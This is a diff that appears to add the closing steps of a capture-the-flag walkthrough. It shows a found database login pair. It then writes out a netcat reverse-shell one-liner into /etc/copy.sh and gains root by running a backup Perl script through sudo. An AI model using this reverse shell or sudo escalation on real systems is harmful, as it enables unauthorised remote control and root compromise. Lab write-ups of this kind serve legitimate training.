@@ -179,5 +179,19 @@ cat mysql_login.txt
 rice:randompass
 
 
+-------------------------
 
+Copy and paste the following into your hacked shell:
 
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
+
+- Making sure to change the local ip and port number to an appropriate one
+- Make sure another netcat listener is set up during this with port number corresponding to line above.
+
+After this copy and paste the following line into your hacked machine command line:
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+it will produce an error, HOWEVER if you check your other netcat listener you should see that you now have root access!
+
+read root flag!
